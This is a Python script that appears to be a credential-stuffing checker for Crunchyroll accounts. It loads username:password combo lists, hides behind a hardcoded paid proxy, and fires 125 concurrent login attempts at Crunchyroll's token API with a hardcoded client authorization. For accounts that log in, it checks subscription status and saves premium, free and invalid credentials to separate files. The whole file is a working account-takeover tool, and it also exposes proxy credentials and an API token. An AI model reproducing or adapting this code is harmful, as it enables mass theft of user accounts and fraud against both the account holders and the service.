import requests
import json
from concurrent.futures import ThreadPoolExecutor

def process_account(account):
    username, password = account
    is_premium = check_account(username, password)
    return (username, password, is_premium)
def read_accounts_from_file(filename):
    accounts = []
    with open(filename, 'r') as f:
        for line in f:
            account = tuple(line.strip().split(':'))
            accounts.append(account)
    return accounts
def check_account(username, password):

    proxy = "gw.thunderproxies.net:5959:thunderpJ9pPsBU37O-dc-US:xBKtWmWTvzXUvS843F"
    ip, port, user, pwd = proxy.split(":")
    proxy_dict = {
        "http": f"http://{user}:{pwd}@{ip}:{port}",
        "https": f"http://{user}:{pwd}@{ip}:{port}"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "authorization": "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k=",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    sess = requests.Session()
    sess.proxies.update(proxy_dict)
    sess.headers.update(headers)

    #testing proxies
    #ip_address = sess.get('https://api.ipify.org').text
    #print(f"Public IP address: {ip_address}")

    data = {
        "grant_type": "password",
        "scope": "offline_access",
        "username": username,
        "password": password
    }

    response = sess.post(
        url="https://beta-api.crunchyroll.com/auth/v1/token",
        data=data
    )

    try:
        res_data = response.json()
    except json.JSONDecodeError:
        #print(f"Error decoding JSON for username '{username}': {response.text}") #prints if there's an error on the first request to access token. Prints API response to help debugging
        return False

    if "access_token" in res_data:
        access_token = res_data["access_token"]
        headers["authorization"] = f"Bearer {access_token}"
        sess.headers.update(headers)

        # Get user's external ID
        user_data = sess.get("https://beta-api.crunchyroll.com/accounts/v1/me")
        try:
            user_data = user_data.json()
            external_id = user_data["external_id"]
        except (json.JSONDecodeError, KeyError):
            #print(f"Error decoding JSON or getting external ID for username '{username}': {user_data.text}") #Prints if there's an error retrieving the userexternalID. Prints username associated with API + response
            return False

        # Check subscription status
        subscription_data = sess.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products") #sending get request to retrieve subscription details
        try: #trying to parse the response data
            subscription_data = subscription_data.json()
            total = subscription_data["total"]
        except (json.JSONDecodeError, KeyError):
            #print(f"Error decoding JSON or getting subscription total for username '{username}': {subscription_data.text}") #prints if there's an error trying to parse response OR free account
            return False

        if total: #if total > 0 it contains a subscription
            print(f"{username}: Valid")
            return True
        else: #else if total = 0 --> free subscription
            print(f"{username}: Free Subscription")
            return False
    else: #if there aren't access token = invalid
        print(f"{username}: Invalid")
        return None

accounts = read_accounts_from_file('combos.txt')

# Print the number of accounts imported
total_accounts = len(accounts)
print("Total accounts imported:", total_accounts)

max_threads = 125  # Adjust the number of threads based on your needs
with ThreadPoolExecutor(max_threads) as executor:
    results = executor.map(process_account, accounts)


def save_to_file(filename, content):
    with open(filename, 'a') as f:
        f.write(content + "\n")

for username, password, is_premium in results:
    if is_premium is None:  # Check if the result is None (invalid)
        print(f"{username}:{password}:Invalid")
        save_to_file("invalid.txt", f"{username}:{password}:Invalid")
    elif is_premium:
        print(f"{username}:{password}:Premium")
        save_to_file("premium.txt", f"{username}:{password}:Premium")
    else:
        print(f"{username}:{password}:Free")
        save_to_file("free.txt", f"{username}:{password}:Free")







